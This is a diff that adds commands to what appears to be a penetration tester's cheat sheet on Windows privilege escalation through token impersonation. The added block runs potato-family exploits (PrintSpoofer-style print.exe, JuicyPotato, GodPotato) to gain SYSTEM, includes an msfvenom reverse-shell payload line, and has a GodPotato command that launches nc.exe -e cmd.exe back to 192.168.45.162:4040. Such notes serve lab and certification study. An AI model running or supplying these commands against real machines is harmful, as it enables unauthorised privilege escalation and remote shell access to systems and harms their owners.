@@ -128,6 +128,14 @@ schtasks /query /fo LIST /v
 ```
 ---
 # Windows Privilege Escalation — Token Impersonation (SeImpersonatePrivilege)
+```powershell
+.\print.exe -i -c cmd.exe
+
+# msfvenom -p windows/x64/shell_reverse_tcp -f exe
+.\JuicyPotato.exe -t * -p shell.exe -l 443 -c <CLSID>
+
+.\GodPotato.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe -e cmd.exe 192.168.45.162 4040"
+```
 - https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070
 - https://github.com/ohpe/juicy-potato `CLSID`
 ---
